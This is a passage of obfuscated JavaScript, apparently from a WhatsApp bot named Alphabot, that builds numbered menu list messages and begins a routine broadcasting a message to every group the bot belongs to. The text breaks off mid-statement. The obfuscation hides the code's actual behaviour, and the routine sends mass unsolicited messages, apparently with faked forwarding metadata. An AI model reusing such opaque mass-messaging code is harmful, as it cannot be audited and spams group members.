_0x1c1f7b={};_0x1c1f7b[_0x593f96(0x958,0xafe,0xa84,0xbc4)]=_0x593f96(0xa50,0xc59,0x8b4,0xb4a),_0x1c1f7b[_0x593f96(0x3f1,0x58f,0x4fd,0x3d6)+'n']=_0x593f96(0xccc,0x8ce,0xa5a,0x82a)+'this\x20if\x20yo'+'u\x20want\x20to\x20'+_0x1e23e4(0x7fb,0x1ac,0x61a,0x5d6)+'oupmenu\x20co'+_0x593f96(0x4cd,0x740,0x930,0x871),_0x1c1f7b[_0x1e23e4(0xd04,0x741,0xa6e,0xb60)]='0';const _0x101e44={};_0x101e44[_0x593f96(0x958,0x9dc,0xbe8,0xb52)]='☸️\x20Menu\x20ke-'+'2',_0x101e44[_0x1e23e4(0x1c0,0x838,0x6c2,0x518)]=[_0x1c1f7b];const _0x5046db={};_0x5046db[_0x593f96(0x958,0x935,0xde3,0xb71)]=_0x1e23e4(0xba,-0x2bc,0x181,0x353)+'u',_0x5046db['descriptio'+'n']=_0x1e23e4(0x9a3,0x681,0xaee,0xbf5)+_0x1e23e4(0xb5b,0xeb0,0x9c2,0x875)+_0x593f96(0x6a7,0xafb,0x65d,0x5d3)+_0x593f96(0x8e1,0xcc7,0x6c3,0x59a)+_0x593f96(0x56f,0xb8,0xa33,0x923)+_0x1e23e4(0x34e,0x796,0x386,0xfe),_0x5046db[_0x593f96(0xc4c,0x1144,0x779,0xea6)]='0';const _0xba58b5={};_0xba58b5[_0x1e23e4(0x3e5,0x53c,0x77a,0x609)]=_0x1e23e4(0x964,0xb9b,0x9d5,0x5ec)+'3',_0xba58b5['rows']=[_0x5046db];const _0x6ab88e={};_0x6ab88e[_0x1e23e4(0x28a,0x95f,0x77a,0x415)]='funmenu',_0x6ab88e['descriptio'+'n']=_0x593f96(0xccc,0x11e7,0xdd8,0x7bf)+'this\x20if\x20yo'+_0x1e23e4(0x8f4,0x5a,0x4c9,-0x37)+_0x1e23e4(0x87d,0x3b6,0x6ee,0x39a)+_0x1e23e4(0x857,0x24e,0x73a,0x2ba)+'and_',_0x6ab88e[_0x1e23e4(0xc84,0x8bc,0xa6e,0xae7)]='0';const _0x5e0c52={};_0x5e0c52[_0x1e23e4(0x97c,0x63a,0x77a,0x470)]=_0x1e23e4(0x84b,0xc72,0xa4c,0xad3)+'4',_0x5e0c52[_0x1e23e4(0xa0f,0x328,0x6c2,0x20a)]=[_0x6ab88e];const _0x34fff5={};_0x34fff5[_0x1e23e4(0x66f,0xc77,0x77a,0x2ec)]=_0x1e23e4(0x9e5,0xa79,0x75c,0xb24),_0x34fff5[_0x1e23e4(0x571,0xe7,0x213,0x52a)+'n']=_0x1e23e4(0x7d1,0x920,0xaee,0xc4a)+'this\x20if\x20yo'+_0x593f96(0x6a7,0x9d1,0x92a,0x386)+_0x593f96(0x2ba,0x275,0x4dc,0x764)+_0x593f96(0x8ec,0xaa3,0x7ab,0x7ed)+_0x1e23e4(0x3da,0xb7,0x2ef,-0x1f2),_0x34fff5[_0x593f96(0xc4c,0xc00,0x1035,0x10de)]='0';const _0x4f0dc6={};_0x4f0dc6['title']='♋\x20Menu\x20ke-'+'5',_0x4f0dc6['rows']=[_0x34fff5];const _0x358d82={};_0x358d82[_0x593f96(0x958,0xb73,0x754,0x823)]=_0x1e23e4(0x5e4,0x5dd,0x24e,-0x2a2),_0x358d82[_0x1e23e4(-0x66,0x639,0x213,-0x269)+'n']=_0x593f96(0xccc,0xcdd,0x9d7,0x950)+_0x1e23e4(0x561,0x813,0x9c2,0x6d0)+'u\x20want\x20to\x20'+'use\x20the\x20ot'+_0x593f96(0x31f,0x2f2,0x493,0x386)+_0x593f96(0x4cd,0x4e6,0x45c,0x22a),_0x358d82[_0x593f96(0xc4c,0xcbe,0x924,0xa04)]='0';const _0x1a9e73={};_0x1a9e73[_0x593f96(0x958,0xe2c,0xa2c,0x51b)]='♌\x20Menu\x20ke-'+'6',_0x1a9e73[_0x1e23e4(0x3d1,0x907,0x6c2,0xb90)]=[_0x358d82];const _0x1ad5d5={};_0x1ad5d5['title']=_0x593f96(0x3ba,0x35c,0x509,0x183),_0x1ad5d5[_0x593f96(0x3f1,0x2e1,0x308,0x78f)+'n']=_0x1e23e4(0xa76,0x716,0xaee,0xfb9)+_0x593f96(0xba0,0x738,0xaa6,0x82b)+_0x593f96(0x6a7,0x6d7,0x4ff,0x616)+_0x593f96(0xb94,0x8e8,0xeab,0xa83)+_0x1e23e4(0x122,0x3d0,0x3a0,0x2d9)+_0x1e23e4(0x667,0xf0,0x2ef,0x4d3),_0x1ad5d5['rowId']='0';const _0x20cd45={};_0x20cd45['title']='♍\x20Menu\x20ke-'+'7',_0x20cd45['rows']=[_0x1ad5d5];const _0x4000be={};_0x4000be[_0x1e23e4(0xb56,0x6d8,0x77a,0xa19)]=_0x593f96(0x547,0x202,0x91a,0x186)+'u',_0x4000be[_0x1e23e4(0x1,0x120,0x213,0x55)+'n']=_0x593f96(0xccc,0xa72,0xd6f,0x111c)+_0x1e23e4(0xad0,0xeba,0x9c2,0x800)+_0x593f96(0x6a7,0x803,0x1a7,0xad6)+_0x593f96(0xb0c,0x747,0xefc,0x89b)+_0x593f96(0x45c,0x52e,0x73,0x402)+_0x1e23e4(0x7e3,0x97,0x386,0x43b),_0x4000be[_0x1e23e4(0xc9d,0xea6,0xa6e,0x962)]='0';const _0x43d0ad={};_0x43d0ad['title']=_0x593f96(0x900,0xb9a,0x683,0x6e6)+'8',_0x43d0ad[_0x1e23e4(0x9ed,0xa0f,0x6c2,0x296)]=[_0x4000be];const _0x48d512={};_0x48d512[_0x593f96(0x958,0xd66,0xb42,0xd9e)]=_0x593f96(0x491,-0x3b,0x5d6,0x502),_0x48d512[_0x1e23e4(-0x95,0x153,0x213,0x3e)+'n']=_0x1e23e4(0xb23,0xde0,0xaee,0xade)+_0x593f96(0xba0,0xa80,0x6cc,0xadd)+_0x593f96(0x6a7,0x69a,0x641,0x93c)+_0x1e23e4(0x596,0x2c0,0x6da,0x7de)+_0x593f96(0xa52,0xbc0,0x922,0xd41)+'and_',_0x48d512[_0x593f96(0xc4c,0x85f,0xdc0,0xc28)]='0';const _0x3297eb={};_0x3297eb['title']='♏\x20Menu\x20ke-'+'9',_0x3297eb[_0x593f96(0x8a0,0x7cc,0x6bc,0xca4)]=[_0x48d512];const _0xeb381c={};_0xeb381c[_0x1e23e4(0xa8b,0xa9d,0x77a,0xbb2)]=_0x1e23e4(0xc21,0xb09,0xae3,0xa4e),_0xeb381c['descriptio'+'n']=_0x1e23e4(0x648,0x9a8,0xaee,0xe5f)+_0x1e23e4(0xa2c,0xda2,0x9c2,0xbd1)+_0x593f96(0x6a7,0xa1b,0x3ce,0x9cf)+_0x1e23e4(0x945,0x7bc,0xaa7,0xdc3)+_0x1e23e4(0x75e,0x84c,0xac0,0xbef)+_0x1e23e4(0x7e7,0x1d8,0x4e1,0x6be),_0xeb381c['rowId']='0';const _0x1a6a98={};_0x1a6a98['title']=_0x1e23e4(0x50e,0x5a4,0x508,0x634)+'10',_0x1a6a98['rows']=[_0xeb381c];const _0x1e1641={};_0x1e1641[_0x593f96(0x958,0xdab,0xe57,0xcca)]='set\x20sticke'+'r\x20cmd',_0x1e1641['descriptio'+'n']=_0x593f96(0xccc,0xb35,0xff9,0xfc7)+'this\x20if\x20yo'+'u\x20want\x20to\x20'+'use\x20the\x20se'+'t\x20stc\x20cmd\x20'+_0x593f96(0x564,0x101,0x8c8,0x817),_0x1e1641[_0x1e23e4(0xa79,0xa86,0xa6e,0xe6b)]='0';const _0x10c454={};_0x10c454['title']=_0x593f96(0xcab,0xaba,0xdfd,0x9d7)+'11',_0x10c454[_0x1e23e4(0x42b,0x74f,0x6c2,0x41f)]=[_0x1e1641];const _0x576cab={};_0x576cab[_0x1e23e4(0x605,0xb74,0x77a,0x59d)]='gacha\x20ceca'+'n',_0x576cab[_0x1e23e4(-0x2e2,0x474,0x213,0x5c)+'n']='\x0a\x0a_choose\x20'+_0x593f96(0xba0,0x9dc,0xc4f,0xb9f)+_0x593f96(0x6a7,0xab2,0x1d2,0x4c4)+_0x593f96(0x82e,0x731,0xb01,0xaf2)+_0x593f96(0x7b5,0x7b3,0x73d,0x826)+_0x1e23e4(0x771,0x842,0x8cf,0x93b),_0x576cab[_0x593f96(0xc4c,0xfc1,0xe7a,0xf93)]='0';const _0x1774e3={};_0x1774e3[_0x1e23e4(0x41e,0x599,0x77a,0x8fb)]='♒\x20Menu\x20ke-'+'12',_0x1774e3['rows']=[_0x576cab];const _0x50447b={};_0x50447b[_0x593f96(0x958,0xd9b,0x691,0x632)]='telegram\x20s'+'ticker',_0x50447b[_0x593f96(0x3f1,0x3bf,0x713,0x31e)+'n']=_0x1e23e4(0xc5a,0xc13,0xaee,0xeb6)+_0x1e23e4(0x98d,0x951,0x9c2,0x78e)+_0x593f96(0x6a7,0x327,0x7d4,0x242)+_0x1e23e4(0xc2b,0x8bb,0x823,0x525)+_0x593f96(0xbe7,0x873,0xbc4,0x91d)+_0x593f96(0xa84,0xbd4,0x7a4,0xe9e),_0x50447b[_0x593f96(0xc4c,0xf99,0xc01,0xf31)]='0';const _0x1ac361={};_0x1ac361[_0x1e23e4(0x2ec,0x5c8,0x77a,0x6a7)]='♓\x20Menu\x20ke-'+'13',_0x1ac361[_0x1e23e4(0xab2,0x564,0x6c2,0x3d7)]=[_0x50447b];const _0x277b06={};_0x277b06['title']=_0x1e23e4(0x5cc,0x728,0x388,0x632),_0x277b06[_0x1e23e4(-0x9e,0x66d,0x213,0xf4)+'n']=_0x593f96(0xccc,0xab4,0x845,0x8e6)+'this\x20if\x20yo'+'u\x20want\x20to\x20'+_0x1e23e4(0xe49,0x7c1,0x976,0xba8)+_0x1e23e4(0xbf0,0x952,0xa81,0x644)+'mand_',_0x277b06[_0x593f96(0xc4c,0x1105,0xeea,0xa4b)]='0';const _0x36c456={};_0x36c456[_0x1e23e4(0x794,0x30e,0x77a,0x832)]=_0x593f96(0xab0,0xa26,0xeaf,0xbd2)+'14',_0x36c456[_0x1e23e4(0x7ea,0x531,0x6c2,0xb58)]=[_0x277b06];const _0x5ecf33={};_0x5ecf33['title']=_0x1e23e4(0x777,0xeaf,0x995,0xd34)+'u',_0x5ecf33[_0x593f96(0x3f1,0x115,0x484,-0x88)+'n']='\x0a\x0a_choose\x20'+_0x593f96(0xba0,0xd65,0x7b2,0x860)+_0x593f96(0x6a7,0xafd,0x9bc,0x4a4)+'use\x20the\x20as'+'upan\x20menu\x20'+'command_',_0x5ecf33[_0x1e23e4(0xf51,0x67a,0xa6e,0xd37)]='0';const _0x51b0e8={};_0x51b0e8['title']=_0x1e23e4(0xa1b,0xe30,0x9f4,0xd18)+'15',_0x51b0e8['rows']=[_0x5ecf33];const _0xb54031={};_0xb54031[_0x593f96(0x958,0xe46,0x74c,0x7ab)]=_0x1e23e4(0x793,0x7d4,0x757,0x5d5)+'ct',_0xb54031['descriptio'+'n']=_0x1e23e4(0xb43,0xad4,0xaee,0x8ce)+_0x1e23e4(0x63a,0xca7,0x9c2,0xccf)+_0x593f96(0x6a7,0x4e4,0x2ba,0x90e)+_0x593f96(0xa1d,0xb86,0x5af,0xa4b)+_0x593f96(0x379,0x3d,0x56e,-0x67)+_0x1e23e4(0xa7c,0x737,0x933,0x86f)+_0x593f96(0xa84,0x9fa,0x776,0x9dc),_0xb54031[_0x593f96(0xc4c,0xfd9,0x78f,0x8bd)]='0';const _0x301481={};_0x301481[_0x593f96(0x958,0xad8,0xe3b,0xa62)]='♂️\x20Menu\x20ke-'+'16',_0x301481[_0x593f96(0x8a0,0xd63,0x978,0xa6b)]=[_0xb54031];const _0xebd2fc={};_0xebd2fc[_0x593f96(0x958,0x908,0x8b5,0xa68)]=_0x593f96(0x45b,-0x29,0x8ba,0x2f7)+'n',_0xebd2fc[_0x1e23e4(0x3f,0x3b1,0x213,0x6c3)+'n']=_0x593f96(0xccc,0x9de,0x10f5,0xb0c)+_0x593f96(0xba0,0x85c,0xa22,0x8aa)+_0x593f96(0x6a7,0x6f7,0x22a,0x79a)+_0x593f96(0x82e,0x556,0x7c2,0x4aa)+_0x593f96(0x9cf,0x8e5,0x876,0x7bb)+_0x1e23e4(0x3e1,-0x39,0x386,0x433),_0xebd2fc[_0x1e23e4(0xcdc,0x55a,0xa6e,0xd1a)]='0';const _0x3a77fd={};_0x3a77fd[_0x1e23e4(0xaa5,0x2f5,0x77a,0x400)]=_0x593f96(0xc5e,0x872,0xfa3,0xd24)+'17',_0x3a77fd[_0x593f96(0x8a0,0x821,0xd39,0x760)]=[_0xebd2fc];const _0x1fb9ca={};_0x1fb9ca[_0x1e23e4(0x94a,0x876,0x77a,0xc72)]='quotesmenu',_0x1fb9ca[_0x593f96(0x3f1,0x516,0x2c9,0x4a9)+'n']=_0x593f96(0xccc,0xabb,0xc6e,0xd74)+'this\x20if\x20yo'+_0x593f96(0x6a7,0x7f2,0x800,0x9d7)+'use\x20the\x20qu'+_0x593f96(0xa79,0xf4f,0x677,0x5df)+_0x1e23e4(0x6d8,0xc2f,0x8cf,0x61a),_0x1fb9ca[_0x593f96(0xc4c,0xc45,0x9c8,0xf75)]='0';const _0x6e9186={};_0x6e9186[_0x593f96(0x958,0xde6,0xe5d,0xc8d)]='〽️\x20Menu\x20ke-'+'18',_0x6e9186[_0x1e23e4(0xb4c,0x953,0x6c2,0xb84)]=[_0x1fb9ca];const _0x3179ec={};_0x3179ec[_0x1e23e4(0x9ec,0x87c,0x77a,0xaf6)]=_0x593f96(0x816,0x50c,0x6ed,0x510),_0x3179ec['descriptio'+'n']=_0x593f96(0xccc,0xca8,0xee3,0xa0a)+_0x1e23e4(0x57a,0x99f,0x9c2,0x730)+_0x1e23e4(0x8a3,0x348,0x4c9,0x3a6)+_0x593f96(0x9ef,0xbda,0xcb4,0xe5d)+_0x593f96(0x3bf,-0x125,0x4be,0x47a)+'mmand_',_0x3179ec[_0x1e23e4(0xa61,0xc12,0xa6e,0x832)]='0';const _0x83049b={};_0x83049b[_0x593f96(0x958,0xadb,0xd3f,0xd58)]=_0x1e23e4(0xfc2,0x6cd,0xaad,0xc5f)+'19',_0x83049b[_0x1e23e4(0x82f,0x370,0x6c2,0x890)]=[_0x3179ec];const _0x50479a={};_0x50479a[_0x1e23e4(0x7a4,0x495,0x77a,0x297)]=_0x593f96(0x6fa,0xac2,0xa4b,0x939)+'u',_0x50479a[_0x1e23e4(-0x17b,-0x278,0x213,0x1b9)+'n']=_0x593f96(0xccc,0x112d,0x7f1,0xff4)+_0x1e23e4(0xba1,0xe9a,0x9c2,0x519)+'u\x20want\x20to\x20'+'use\x20the\x20te'+_0x1e23e4(0x65a,0x33a,0x273,0x744)+_0x593f96(0x564,0x40e,0xa6a,0x4f1),_0x50479a[_0x593f96(0xc4c,0xcfd,0xb35,0x981)]='0';const _0xf9ccbb={};_0xf9ccbb[_0x1e23e4(0x83a,0x4e6,0x77a,0x746)]='☢️\x20Menu\x20ke-'+'20',_0xf9ccbb[_0x593f96(0x8a0,0xca2,0x54e,0xad9)]=[_0x50479a];const _0x2208c4={};_0x2208c4[_0x593f96(0x958,0x5f3,0x81c,0x905)]=_0x1e23e4(0xcce,0xab9,0xa7b,0xcec)+'nu',_0x2208c4[_0x593f96(0x3f1,0x79,0x206,0x36d)+'n']='\x0a\x0a_choose\x20'+_0x1e23e4(0x857,0xaf1,0x9c2,0x55d)+_0x1e23e4(0x205,0x432,0x4c9,0x48)+_0x1e23e4(0x34b,0x842,0x6a2,0x685)+_0x1e23e4(0x2d3,-0x259,0x271,-0x26e)+_0x1e23e4(0xda,0x6e5,0x42a,0x3dc),_0x2208c4[_0x1e23e4(0x5c5,0xea2,0xa6e,0xc8a)]='0';const _0x13f60a={};_0x13f60a[_0x593f96(0x958,0x68b,0x458,0xd5f)]=_0x1e23e4(0x56f,0x94f,0x7a3,0x44c)+'21',_0x13f60a[_0x593f96(0x8a0,0xd25,0x46f,0x4e8)]=[_0x2208c4];const _0x5ec9e8={};_0x5ec9e8[_0x1e23e4(0xbd7,0x442,0x77a,0x2d2)]=_0x1e23e4(0x625,0x186,0x58d,0x81b)+'e',_0x5ec9e8[_0x593f96(0x3f1,0x4e1,-0xf0,0x2a1)+'n']=_0x1e23e4(0x71c,0xb26,0xaee,0xd65)+_0x1e23e4(0x8b7,0xc47,0x9c2,0xe20)+_0x1e23e4(0x267,0x7d6,0x4c9,0x6fa)+_0x1e23e4(0xaad,0xc74,0x87e,0xd2f)+_0x1e23e4(0x3b9,-0x1c6,0x17a,-0x270)+_0x593f96(0x96d,0x698,0xd63,0x9d0),_0x5ec9e8['rowId']=_0x1e23e4(0x879,0x45b,0x58d,0x8a1)+'e';const _0x255a62={};_0x255a62[_0x1e23e4(0xb7e,0x391,0x77a,0x6c0)]=_0x1e23e4(0xa50,0xa34,0x98d,0x599)+_0x1e23e4(-0xf6,0x219,0x282,0x29b),_0x255a62[_0x593f96(0x8a0,0xbb4,0xbb5,0xc58)]=[_0x5ec9e8];const _0x49418d={};_0x49418d[_0x593f96(0x958,0xa9c,0x5a7,0xe57)]=_0x593f96(0x301,0x483,0x419,0x4f3)+_0x1e23e4(0xa9d,0xb4d,0x899,0xb2d),_0x49418d[_0x1e23e4(0x567,-0x46,0x213,0x464)+'n']=_0x1e23e4(0x1000,0x8c3,0xaee,0xbd5)+_0x1e23e4(0xe98,0x4df,0x9c2,0x871)+_0x593f96(0x6a7,0x514,0x537,0xae6)+_0x1e23e4(0x7e2,0x2ea,0x419,0x249)+'e\x20who\x20cont'+_0x593f96(0xc07,0x823,0xecc,0x883)+_0x593f96(0xb1c,0xabf,0x93b,0x724)+_0x1e23e4(0xadb,0x6ce,0x8c5,0x913),_0x49418d[_0x593f96(0xc4c,0xbdb,0xd79,0x734)]='0';const _0x57622d={};_0x57622d[_0x593f96(0x958,0x9c4,0x915,0xc3e)]='🏆\x20Contribu'+_0x1e23e4(0x992,0x8cb,0x4b4,0x508),_0x57622d[_0x593f96(0x8a0,0x401,0x8a8,0xd36)]=[_0x49418d];let pip=alpha[_0x1e23e4(0x6e0,0xa3c,0x781,0x6b6)+_0x593f96(0x8c2,0xccc,0xb6d,0x3c7)+_0x1e23e4(-0x92,-0x284,0x1c5,0x121)](from,{'listMessage':{'title':_0x593f96(0x830,0x93e,0x432,0x9f4)+_0x593f96(0x8a4,0xc89,0xd0d,0xc60),'description':'Hai\x20@'+sender[_0x1e23e4(0x33,-0x2c3,0x133,0x5d)]('@')[-0x653+-0xe09+0x145c]+(_0x593f96(0x63a,0x30a,0x124,0x52c)+_0x1e23e4(0xa6e,0x4a5,0x937,0xd7b)+_0x1e23e4(0x86b,0x5f5,0xab5,0x630)+_0x1e23e4(0x44e,0x7a1,0x5a6,0x56d)+_0x1e23e4(0x82c,0x80f,0x625,0x8bf)+_0x1e23e4(0x74a,0x8f5,0x9d0,0x8a0)+_0x593f96(0x964,0x6be,0xdc4,0xe11)+_0x1e23e4(0xab8,0x8f6,0x5da,0x546)+_0x1e23e4(0x6ab,0xa34,0x798,0x93f)),'buttonText':_0x593f96(0xcad,0x884,0x116d,0xe33)+'E','footerText':''+creator,'listType':_0x1e23e4(0x7e2,0x7fe,0xaed,0x674)+_0x593f96(0x5f8,0x396,0x6de,0x53e),'sections':[_0x18dc83,_0x8f2261,_0x101e44,_0xba58b5,_0x5e0c52,_0x4f0dc6,_0x1a9e73,_0x20cd45,_0x43d0ad,_0x3297eb,_0x1a6a98,_0x10c454,_0x1774e3,_0x1ac361,_0x36c456,_0x51b0e8,_0x301481,_0x3a77fd,_0x6e9186,_0x83049b,_0xf9ccbb,_0x13f60a,_0x255a62,_0x57622d]}},{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});const _0x2abec2={};_0x2abec2[_0x593f96(0x3d5,0x7ee,0x12c,-0x4e)]=!![],alpha[_0x1e23e4(0xae1,0x5f9,0x8f9,0x743)+_0x593f96(0xc5b,0xe33,0x1034,0xcda)](pip,_0x2abec2);}if(subscribezeeoneofc==_0x593f96(0xabc,0x9c1,0x901,0x607)){console[_0x1e23e4(0x3a8,0x558,0x58e,0xa69)](color(time,_0x593f96(0x359,-0x120,0x811,0x76e)),color('Button\x20mes'+_0x1e23e4(0x3c8,0x217,0x5bd,0x6ad)+_0x1e23e4(0x945,0x100,0x5fe,0x7b2)));const _0x593dd2={};_0x593dd2['title']='Group\x20What'+_0x1e23e4(0x5da,0x9e0,0x8a8,0x4cc),_0x593dd2[_0x1e23e4(0x3d8,-0x1bf,0x213,0x1f8)+'n']=_0x1e23e4(0xa96,0xa31,0xaee,0xacc)+_0x593f96(0xba0,0xbe6,0x7a7,0x1042)+_0x1e23e4(-0x2f,0x777,0x4c9,0x25e)+'join\x20the\x20g'+_0x593f96(0x89d,0x8ff,0xbb9,0xa83),_0x593dd2['rowId']='0';const _0x7b87e6={};_0x7b87e6[_0x593f96(0x958,0x735,0xcf2,0x72a)]='さ\x20Group\x20wh'+'atsapp\x20bot',_0x7b87e6['rows']=[_0x593dd2];const _0x5a7332={};_0x5a7332[_0x1e23e4(0xa14,0x9cd,0x77a,0xbef)]='Alphabot\x20s'+'upport',_0x5a7332[_0x593f96(0x3f1,0x26e,0x366,0x4df)+'n']=_0x593f96(0xccc,0x11da,0xeb9,0xd08)+_0x593f96(0xba0,0xc8f,0xa07,0xfad)+_0x1e23e4(0x45f,0x824,0x4c9,0x3d7)+_0x593f96(0xbca,0xcfa,0xd57,0xef1)+_0x1e23e4(0x4b1,0x6c0,0x3c7,0x552)+_0x1e23e4(0xb7f,0xc10,0x746,0x9af),_0x5a7332['rowId']='0';const _0x461f2d={};_0x461f2d[_0x1e23e4(0x8b7,0xb1a,0x77a,0x30b)]=_0x1e23e4(0xa5a,0x4a1,0x55d,0x5df)+_0x1e23e4(-0x1a8,0x56a,0x26f,0x28c),_0x461f2d[_0x593f96(0x8a0,0xa7a,0x757,0x7da)]=[_0x5a7332];const _0x3275dc={};_0x3275dc[_0x1e23e4(0x398,0x3ec,0x77a,0x847)]=_0x1e23e4(0x5fd,0xf3e,0xa26,0xa31)+_0x593f96(0x8ab,0xb70,0x876,0x98c),_0x3275dc['descriptio'+'n']=_0x593f96(0xccc,0x112d,0x1113,0xe67)+_0x1e23e4(0xa94,0x5fe,0x9c2,0xe5f)+'u\x20want\x20to\x20'+_0x1e23e4(0x67a,0xa35,0x9ec,0xebc)+_0x593f96(0x5a5,0x6da,0x3fb,0x76d)+_0x1e23e4(0x738,0x571,0x746,0x591),_0x3275dc[_0x1e23e4(0x578,0xdc0,0xa6e,0xe24)]='0';const _0x1fbf90={};_0x1fbf90[_0x1e23e4(0xb91,0x84a,0x77a,0xbff)]='な\x20Group\x20Al'+'phabot\x202',_0x1fbf90[_0x1e23e4(0x5db,0x8f0,0x6c2,0x232)]=[_0x3275dc];const _0x797fda={};_0x797fda[_0x1e23e4(0x847,0x46a,0x77a,0x283)]=''+ucapannya2,_0x797fda[_0x593f96(0x3f1,-0xd2,0x79b,0x2b1)+'n']='List\x20group'+_0x593f96(0x3ce,0x7f2,0x7bc,0x3bd)+'\x20official\x20'+_0x1e23e4(0x6a8,0x62d,0x2fd,0x27d)+_0x593f96(0xa26,0xb50,0xb9f,0x75b)+_0x593f96(0x70b,0x9ee,0x228,0x729)+_0x593f96(0x841,0x640,0xae4,0xb84)+'🤙',_0x797fda['buttonText']=_0x1e23e4(0xdd8,0x70c,0xacf,0xd6e)+'E',_0x797fda[_0x1e23e4(0x5a4,0x2fa,0x3d2,-0xcb)]=''+creator,_0x797fda['listType']=_0x593f96(0xccb,0xd73,0xfb9,0x1142)+_0x593f96(0x5f8,0x821,0x983,0x740),_0x797fda[_0x1e23e4(0x93e,0x487,0x75b,0x774)]=[_0x7b87e6,_0x461f2d,_0x1fbf90];const _0xc275ff={};_0xc275ff['listMessag'+'e']=_0x797fda;let pipi=alpha[_0x593f96(0x95f,0x655,0x930,0x89e)+_0x593f96(0x8c2,0xd56,0x91c,0xbdb)+'ntent'](from,_0xc275ff,{});const _0x534373={};_0x534373[_0x1e23e4(0x6cf,0x43,0x1f7,0x15e)]=!![],alpha[_0x593f96(0xad7,0xeb6,0xa47,0xb92)+_0x1e23e4(0x56e,0xc0e,0xa7d,0x832)](pipi,_0x534373);}const ini_bc_gc_bang=_0x2774e0=>{const _0x319fe8={'oRKog':function(_0x20e705,_0x345f14){return _0x20e705*_0x345f14;},'YucrN':function(_0x11b0fb,_0x473892){return _0x11b0fb(_0x473892);},'aHBUi':function(_0x49f296,_0x5c013b){return _0x49f296!==_0x5c013b;},'zNXtN':_0x2e8768(0x45b,0x5ea,0x9e8,0x38b),'zpuCm':_0x3153a4(-0x194,-0x110,-0x60b,0x2b6),'hIasg':_0x3153a4(-0x1ba,-0x370,-0x2dd,-0x414),'jBOQv':_0x3153a4(0x528,0x2fc,0xa39,0x95)+'a','hJDTT':_0x2e8768(0x5de,0x31e,0x5b,0x3f)+'21'};var _0x2f10b5=alpha[_0x3153a4(0x7b5,0x6f4,0x466,0x5a1)][_0x3153a4(0x17f,-0x254,-0x34d,-0x20f)]()['filter'](_0x2a3f52=>_0x2a3f52[_0x3153a4(-0x1b3,0x253,-0x5de,-0x1bd)][_0x3153a4(-0x104,-0x509,-0x381,0x251)](_0x2e8768(0x989,0x627,0xb2b,0x39c)));function _0x2e8768(_0x25878c,_0x3cdbbd,_0x4699ca,_0x8a8c31){return _0x593f96(_0x3cdbbd- -0x1df,_0x8a8c31,_0x4699ca-0x71,_0x8a8c31-0x138);}let _0x34da6c=_0x2774e0;function _0x3153a4(_0x29be34,_0x4c6959,_0x4e69e5,_0x19cc26){return _0x1e23e4(_0x29be34-0x170,_0x4c6959-0x88,_0x29be34- -0x331,_0x19cc26);}for(let _0x22924c of _0x2f10b5){if(_0x319fe8[_0x2e8768(0x8b3,0x486,0x212,0x606)](_0x3153a4(0x2b1,0x6c4,0x5d2,0x0),_0x2e8768(0x3ee,0x5e1,0x6ac,0x7ce))){const _0x5de254=_0xa12abf[_0x2e8768(0xf36,0xa20,0x8c2,0xdfe)+_0x3153a4(0x187,0x59,0x33c,0x17e)][_0x3153a4(0x419,0x789,0x1f0,0x914)][_0x2e8768(0x7e0,0x626,0xaea,0xb0d)][_0x46531a[_0x2e8768(0x301,0x28f,-0x13e,-0xf)](_0x319fe8[_0x2e8768(0x9cb,0x88c,0xa3a,0x8e4)](_0x271bfd[_0x3153a4(0x24c,0x6b4,-0x1df,0x43e)](),_0xe313b6[_0x2e8768(0x534,0xa20,0x550,0x8ad)+_0x2e8768(0x7d,0x4b7,0x5ad,0x68b)][_0x2e8768(0x8f1,0x749,0x9ef,0x4e3)][_0x3153a4(0x2f6,0x477,0x387,0x4e)][_0x3153a4(0x5d9,0xfe,0x3df,0x2a3)]))];var _0x36b8c8=[];const _0x479a5f={};_0x479a5f[_0x2e8768(-0x360,0xf2,-0x32f,-0x2b2)]=_0x5de254[_0x3153a4(-0x11d,-0x5c0,0x2f5,-0x162)][_0x3153a4(0x608,0x17d,0x856,0x506)]['url'],_0x36b8c8['push'](_0x479a5f),_0x319fe8[_0x2e8768(0x85c,0xaa3,0xcc2,0x6a5)](_0xc81f7c,_0x36b8c8);}else{const _0x269d4b={};_0x269d4b['buttonId']=_0x319fe8[_0x2e8768(0x376,0x211,-0x257,-0x2fb)],_0x269d4b[_0x3153a4(-0x26b,-0x412,-0x712,0x15d)]={},_0x269d4b[_0x2e8768(0x843,0x99f,0xe76,0xd3d)]=0x1,_0x269d4b[_0x3153a4(-0x26b,-0x412,-0x712,0x15d)][_0x3153a4(-0x153,-0x253,-0x1f2,0x166)+'t']=_0x319fe8[_0x3153a4(0x678,0xa9a,0x97f,0xaec)];const _0x46970a={};_0x46970a[_0x3153a4(-0x131,0x1ea,0x365,-0x52)]=_0x319fe8[_0x2e8768(0x409,0x69b,0x89f,0x661)],_0x46970a[_0x3153a4(-0x26b,-0x523,-0x26,-0x5d5)]={},_0x46970a[_0x3153a4(0x66f,0x680,0x740,0xa8a)]=0x1,_0x46970a[_0x3153a4(-0x26b,-0x523,-0x26,-0x5d5)][_0x3153a4(-0x153,-0x29f,-0x46,-0x365)+'t']=_0x319fe8[_0x2e8768(0x609,0x504,0xdd,0x6a0)];var _0x489ab6=[_0x269d4b,_0x46970a];const _0x275aef={};_0x275aef[_0x2e8768(0xf2,0x2d6,0x469,0x648)+'t']=_0x2e8768(0x5e5,0x724,0xb41,0xaf0)+'*'+enter+enter+_0x34da6c,_0x275aef['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x275aef[_0x3153a4(0x5be,0x9d9,0x232,0x8c1)]=_0x489ab6,_0x275aef[_0x3153a4(0x469,0x5b9,0x3a2,0x168)]=0x1;var _0x43ee8f=_0x275aef;const _0x3ea289={};_0x3ea289[_0x3153a4(0x739,0x57e,0x8df,0x625)]='hi',_0x3ea289[_0x3153a4(0x4ff,0x476,0x2,0x6b5)+_0x2e8768(0x535,0x607,0xa80,0x931)]=0x3b9aca00,_0x3ea289[_0x3153a4(0x77e,0x3b3,0x2a5,0x83a)+'d']=!![],_0x3ea289[_0x2e8768(-0x2ab,0x141,-0x1ad,-0x2b)+'ral']=!![];const 